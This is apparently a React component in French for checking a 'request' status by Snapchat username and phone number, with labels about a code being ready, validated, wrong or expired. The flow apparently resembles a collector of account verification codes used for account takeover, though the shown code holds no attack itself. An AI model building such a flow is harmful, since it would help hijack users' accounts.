import { useState } from "react";
import { motion } from "framer-motion";
import { ChevronRight, ArrowLeft } from "lucide-react";
import { base44 } from "@/api/base44Client";

export default function StatusCheck({ onBack }) {
   const [snapchat, setSnapchat] = useState("");
   const [submissionId, setSubmissionId] = useState("");
   const [status, setStatus] = useState(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");

  const statusLabels = {
    pending: "En attente de code",
    code_ready: "Code prêt à être envoyé",
    code_valid: "Code validé ✓",
    code_wrong: "Code incorrect",
    code_expired: "Code expiré",
    waiting_queue: "En attente de traitement",
  };

  const formatPhone = (digits) => {
    return digits.match(/.{1,2}/g)?.join(" ") || "";
  };

  const handlePhoneChange = (e) => {
    let val = e.target.value.replace(/[^\d]/g, "").slice(0, 10);
    setSubmissionId(val);
    setError("");
  };

  const handleCheck = async (e) => {
    e.preventDefault();
    if (!snapchat.trim() || !submissionId.trim()) {
      setError("Veuillez entrer votre nom Snapchat et votre numéro de téléphone");
      return;
    }

    setLoading(true);
    setError("");
    try {
      const res = await base44.functions.invoke("checkStatus", { submissionId, snapchat });
      setStatus(res?.data?.status || "pending");
    } catch {
      setError("Demande non trouvée");
      setStatus(null);
    }
    setLoading(false);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="w-full max-w-sm mx-auto"
    >
      <div className="bg-card border border-border rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
        <button
          onClick={onBack}
          className="flex items-center gap-1 text-muted-foreground/60 text-xs mb-6 hover:text-muted-foreground transition-colors"
        >
          <ArrowLeft className="w-3 h-3" />
          Retour
        </button>

        <h2 className="font-heading text-2xl font-bold text-foreground mb-2 text-center">
          Suivre ma demande
        </h2>
        <p className="text-muted-foreground text-xs text-center mb-6">
          Entrez votre numéro de téléphone pour vérifier son statut
        </p>

        <form onSubmit={handleCheck} className="space-y-4">
           <div>
             <input
               type="text"
               placeholder="votre_snap"
               value={snapchat}
               onChange={(e) => {
                 setSnapchat(e.target.value);
                 setError("");
               }}
               className="w-full bg-secondary/30 border border-border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-sm"
             />
           </div>

           <div>
             <input
               type="text"
               placeholder="06 06 06 06 06"
               value={formatPhone(submissionId)}
               onChange={handlePhoneChange}
               className="w-full bg-secondary/30 border border-border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-sm"
             />
             {error && (
               <p className="text-destructive text-xs font-medium mt-1">{error}</p>
             )}
           </div>

          <motion.button
            type="submit"
            disabled={loading}
            whileHover={{ scale: loading ? 1 : 1.02 }}
            whileTap={{ scale: loading ? 1 : 0.98 }}
            className="w-full bg-primary text-primary-foreground font-bold py-3 rounded-xl text-sm tracking-wide transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2"
          >
            {loading ? (
              <span className="w-4 h-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
            ) : (
              <>
                Vérifier <ChevronRight className="w-4 h-4" />
              </>
            )}
          </motion.button>
        </form>

        {status && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 p-4 bg-primary/10 border border-primary/30 rounded-xl text-center"
          >
            <p className="text-muted-foreground text-xs mb-2">Statut actuel</p>
            <p className="text-foreground font-semibold text-sm">
              {statusLabels[status] || status}
            </p>
          </motion.div>
        )}

        <p className="text-muted-foreground/40 text-xs text-center mt-6">
          Entrez le numéro de téléphone utilisé lors de votre inscription
        </p>
      </div>
    </motion.div>
  );
}